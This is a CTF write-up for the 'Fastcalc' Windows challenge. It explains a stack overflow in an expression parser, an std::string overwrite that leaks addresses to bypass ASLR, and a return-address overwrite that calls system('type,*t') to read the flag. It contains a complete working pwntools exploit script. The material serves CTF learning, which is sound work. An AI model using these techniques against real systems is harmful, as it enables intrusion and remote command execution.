# Fastcalc 

## Challenge description
```
What would a CONFidence CTF be without a Windows-hosted exploitation challenge? :) This time you're facing a fast, greatly optimized calculator capable of concurrently evaluating multiple expressions. In fact it is so technically advanced that it will only run on CPUs supporting the cutting-edge SSE2 extension. Do you think you can hack it?

Don't be scared too easily by the scoring -- it is mostly meant to encourage pwning this exotic "Windows" system. :-)

The service is running at fastcalc.hackable.software:4141. The flag is in the "flag.txt" file.

The platform is Windows Server 2012 R2. You can reproduce the task's environment by running: AppJailLauncher.exe /outbound /port:4141 /timeout:1000000000 /key:flag.txt fastcalc.exe
```

## Walkthrough
We reversed fastcalc.exe found that it parses a mathmatical expression, and assigns a fiber with the task of calculating the expression.
The parsing included a static array allocated on the stack for values and operations. Looks something like this:
```c
struct {
	int count;
	struct val {
		int type;
		union  {
			char op;
			double num;
		}
	}[LENGTH];
};
```

Not sure what is the original array length. The size of the val struct is 16 bytes (4 DWORDS), type is at +0, op/num is at +8.
Using a large enough expression we can overwrite some of the program stack.

The expression is composed of the following pattern - NUM OP NUM OP NUM OP… NUM

This means that for every 32 bytes we overwrite we control 8 (the number), we write 12 with barely controlled values (the type and op), and 12 bytes that are not overwritten.
This gives us 8 bytes of full control for every 32 bytes.
Luckly for us, this write pattern allowed us to easily avoid corrupting the stack cookie.

First thing we overwrite is an std::string, we change the length to be bigger than allocated.
We also change the capacity to be a small value. (bellow 0x10 bytes)
Since the string capacity is small, it uses the stack as the buffer.
When the string is read, the stack is leaked. (the string is read using the run operation showing the “expression”)

The stack contained pointers to the stack and to the running module providing enough data to bypass ASLR.

The program contained a function that calls system we use this to read the flag.

Overwrite the return address of main and a single DWORD after that.
Point the return address to the opcode “call system”.
Write the string “type,*t” using one of the double values and point the next DWORD to that string.

When the main function returns, it jumps to system with the argument “type,*t” which prints all the files whose name ends with “t”, like the file flag.txt.

exploit code:
```python
from pwn import *

HOST = '192.168.2.100'
PORT = 4141

HOST = 'fastcalc.hackable.software' #:4141

r = remote(HOST, PORT)

SYSTEM_OFFSET = 0xC862
SYSTEM_OFFSET = 0x3055
MODULE_BASE_OFFSET = 0x13483
    
def leak_stack():
    info('leaking the stack')
    r.recvuntil('Operation: ')
    r.send('new\r\n')
    r.recvuntil('expression:')
    
    # the overflow overwrites a expression string (std::string) in the stack.
    # we change capacity to 0 and size to 0x256 to leak stack addresses.
    lcmd = '0.1*' * 129 + "1.26895348305e-311"
    r.send(lcmd + '\n')

    r.recvuntil('Operation: ')
    r.send('run\n')

    d = r.recvuntil('Operation:')

    # drain the running operations
    data = d
    while 'still running' in data:
        r.send('run\n')
        data = r.recvuntil('Operation:')

    PAT = 'Expression '
    idx = d.find(PAT)
    dd = d[idx+len(PAT):]

    # print hexdump(dd)
    
    return dd

dd = leak_stack()
# 0x30 offset to ptr fastcalc+13483
fastcalc_base = u32(dd[0x30:0x34]) - MODULE_BASE_OFFSET

prev_ebp = u32(dd[0x48:0x4c])
cur_ebp = prev_ebp + 0x48 
stack_ptr = cur_ebp - 0x0000006c

system_addr = p32(fastcalc_base+SYSTEM_OFFSET)
stack_addr = p32(stack_ptr)

info("fastcalc_base - {}".format(hex(fastcalc_base)))
info("system_addr - {}".format(hex(u32(system_addr))))
info("stack_addr - {}".format(hex(u32(stack_addr))))

float_value = struct.unpack('d',system_addr+stack_addr)

# 8 bytes cmd without white spaces.
cmd = 'type,*t\x00'
cmd_float = struct.unpack('d', cmd)
lcmd = '0.1*' * 129 + "1.26895348305e-311*1*" + '{:.17e}*{:.17e}'.format(float_value[0], cmd_float[0])

r.send('new\n')

info('overwriting the stack')
r.recvuntil('expression:')
r.send(lcmd + '\n')

info('triggering the exploit')
r.recvuntil('Operation:')
r.send("notoperation\n")

for i in xrange(10):
    print r.recvuntil('\n', timeout=0.1)

r.close()
```

## The Flag
```
DrgnS{F1b3r5_41m057_l1k3_7hr34d5_bu7_n07_qu1t3_s0}
```